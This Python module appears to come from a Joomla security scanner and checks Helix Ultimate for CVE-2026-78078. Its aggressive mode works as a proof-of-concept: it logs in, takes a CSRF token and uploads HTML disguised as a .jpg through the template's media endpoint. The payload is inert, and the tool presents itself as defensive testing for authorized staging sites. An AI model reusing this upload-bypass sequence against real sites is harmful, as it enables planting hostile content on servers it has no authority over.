from __future__ import annotations

import json
import re
import secrets
from typing import Any

from ...core.http import (
    HttpClient,
    build_multipart,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-78078"
NAME = "Helix Ultimate privileged image-upload content-spoofing bypass"
COMPONENT = "Helix Ultimate (helixultimate)"
AFFECTED_RULE = "Helix Ultimate 1.0.0 through 2.2.9; fixed in 2.2.10"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
LOGIN_PAGE = "/index.php?option=com_users&view=login"
LOGIN_POST = "/index.php/component/users?task=user.login"
UPLOAD_PATH = "/index.php?option=com_ajax&helix=ultimate&request=task&action=upload-media&format=json"
TOKEN_RE = re.compile(r'"csrf\.token":"([a-f0-9]{32})"')
INPUT_TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"')


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("2.2.10")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("helixultimate", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Helix Ultimate was not detected through its manifest or template assets.", action="No action is required unless Helix Ultimate is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Helix Ultimate {version}, within the affected range below 2.2.10. The media upload checks only the extension and size."
        action = "Upgrade Helix Ultimate to 2.2.10 or newer (both the template and the framework plugin)."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Helix Ultimate {version}, which validates image MIME and binary content."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Helix Ultimate was detected, but its version could not be determined."
        action = "Determine the installed Helix Ultimate version and upgrade to 2.2.10 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _token(body: str) -> str | None:
    match = TOKEN_RE.search(body) or INPUT_TOKEN_RE.search(body)
    return match.group(1) if match else None


def _frontend_login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> bool:
    page = client.get(f"{base}{LOGIN_PAGE}", timeout=timeout)
    if is_transport_error(page):
        return False
    token = _token(page.get("body") or "")
    if not token:
        return False
    response = client.request(
        f"{base}{LOGIN_POST}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({"username": username, "password": password, token: "1", "return": "aW5kZXgucGhw"}),
        timeout=timeout,
    )
    if is_transport_error(response):
        return False
    body = (response.get("body") or "").lower()
    return "logout" in body or "com_users" in body and "login" not in body[:200]


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Upload non-image HTML content with a .jpg extension as a privileged user.

    2.2.9 and earlier check only the file extension and size before
    ``File::upload()``. 2.2.10 calls ``Helper::isValidImageContent()``
    (``getimagesize`` + ``finfo``) and rejects non-images. Joomla's own
    ``isSafeFile`` blocks PHP tags, so the probe uses inert HTML to prove the
    content-spoofing bypass.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{LOGIN_PAGE}", detail="The upload proof needs an account with core.edit on com_templates. Pass --aggressive-arg username=... password=... on an authorized staging site. Nothing was sent.", action="Re-run with lab administrator credentials.")

    client = HttpClient(timeout=timeout, proxy=proxy)
    if not _frontend_login(client, base, username, password, timeout):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{LOGIN_PAGE}", detail="The frontend login did not establish a privileged session; the upload probe was not attempted.", action="Verify the lab credentials and frontend login route.")

    page = client.get(f"{base}/index.php", timeout=timeout)
    token = _token(page.get("body") or "") if not is_transport_error(page) else None
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/index.php", detail="The privileged session did not expose a CSRF token for the media upload.", action="Verify the session token handling on an authorized staging site.")

    marker = f"PROOFCMS_78078_{secrets.token_hex(4)}"
    filename = f"proofcms-78078-{secrets.token_hex(4)}.jpg"
    payload = f"<html><body>{marker}</body></html>".encode()
    content_type, body = build_multipart({token: "1", "path": "/images"}, {"file": (filename, payload, "image/jpeg")})
    response = client.request(
        f"{base}{UPLOAD_PATH}",
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{UPLOAD_PATH}", detail=f"The upload request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body_text = response.get("body") or ""
    uploaded = False
    try:
        parsed = json.loads(body_text)
        uploaded = bool(parsed.get("status"))
    except ValueError:
        parsed = {}
    file_url = f"{base}/images/{filename}"
    served = client.get(file_url, timeout=timeout)
    served_status = 0 if is_transport_error(served) else served.get("status", 0)
    served_body = "" if is_transport_error(served) else (served.get("body") or "")
    stored = marker in served_body
    evidence = {
        "marker": marker,
        "filename": filename,
        "upload_status": response.get("status"),
        "upload_response": body_text[:160],
        "upload_reported_success": uploaded,
        "file_url": file_url,
        "file_status": served_status,
        "marker_stored": stored,
    }
    if uploaded and stored:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=file_url,
            evidence=evidence,
            detail=(
                "A privileged media upload stored non-image HTML content under a .jpg extension and served it back "
                "from /images/. 2.2.9 and earlier validate only the extension and size; 2.2.10 rejects it as a "
                "non-image. The probe uploaded inert HTML, not executable code."
            ),
            action="Upgrade Helix Ultimate to 2.2.10 or newer and remove unexpected files from /images/.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{UPLOAD_PATH}",
        evidence=evidence,
        detail=(
            f"The upload returned HTTP {response.get('status')} and the file was "
            f"{'not served' if served_status != 200 else 'served without the marker'}; 2.2.10 validates the "
            "image MIME and binary content."
        ),
        action="Upgrade affected Helix Ultimate versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{LOGIN_PAGE}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Helix login page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Helix login page is reachable; the upload payload was not sent in safe mode.", action="Use aggressive mode with a privileged account on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Helix Ultimate was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (login reachability) and aggressive (privileged media upload) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Unrestricted File Upload", "module_version": "1.0.0", "last_reviewed": "2026-11-17", "updated": "2026-11-17", "required_detectors": ["helixultimate"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-78078", "https://github.com/JoomShaper/helix-ultimate/releases/tag/v2.2.10", "https://mysites.guru/vulnerabilities/CVE-2026-78078/"]}
